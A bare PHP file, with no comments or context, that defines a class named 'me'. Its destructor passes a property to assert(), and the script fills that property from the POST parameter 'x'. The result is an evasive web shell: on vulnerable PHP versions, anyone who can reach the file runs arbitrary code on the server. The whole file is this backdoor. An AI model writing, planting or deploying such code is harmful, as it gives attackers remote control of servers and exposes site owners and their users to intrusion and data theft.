<?php 

class me
{
  public $a = '';
  function __destruct(){

    assert("$this->a");
  }
}

$b = new me;
$b->a = $_POST['x'];

?>